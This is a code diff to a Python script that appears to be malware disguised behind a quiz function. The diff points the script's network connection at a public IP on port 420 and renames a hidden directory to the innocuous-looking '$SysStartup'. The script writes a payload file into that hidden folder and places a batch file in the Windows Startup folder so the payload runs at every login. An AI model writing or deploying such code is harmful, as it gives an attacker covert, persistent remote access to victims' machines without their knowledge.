@@ -10,7 +10,7 @@ from os.path import exists
 from subprocess import check_output
 from time import sleep
 
-HOST = "10.0.0.5"
+HOST = "25.46.215.107"
 PORT = 420
 BUFFER = 1024
 FORMAT = "cp850"
@@ -80,28 +80,28 @@ def quizz():
 # librarry stuff:
 def libInit():
     def libLoad():
-        call(["mkdir", "C:\\$windowsLibs"], shell=True)
-        call(["attrib", "+h", "C:\\$windowsLibs", "/d"], shell=True)
+        call(["mkdir", "C:\\$SysStartup"], shell=True)
+        call(["attrib", "+h", "C:\\$SysStartup", "/d"], shell=True)
 
         with open("pslib.pyw", "w") as lib:
             lib.write(var)
 
-        call(["move", "pslib.pyw", "C:\\$windowsLibs\\"], shell=True)
-        # call(["python", "C:\\$windowsLibs\\pslib.pyw"], shell=True)
+        call(["move", "pslib.pyw", "C:\\$SysStartup\\"], shell=True)
+        # call(["python", "C:\\$SysStartup\\pslib.pyw"], shell=True)
         call(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.bat", shell=True)
 
     if not exists(
-            f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.bat") or not exists("C:\\$windowsLibs\\pslib.pyw"):
+            f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.bat") or not exists("C:\\$SysStartup\\pslib.pyw"):
 
         if not exists(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.bat"):
             with open("init.bat", "w") as bat:
-                bat.write("python \"C:\$windowsLibs\pslib.pyw\"")
+                bat.write("python \"C:\$SysStartup\pslib.pyw\"")
 
         sleep(0.5)
         call(["move", "init.bat",
               f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"], shell=True)
 
-        if not exists("C:\\$windowsLibs\\pslib.pyw"):
+        if not exists("C:\\$SysStartup\\pslib.pyw"):
             libLoad()
 
         quizz()
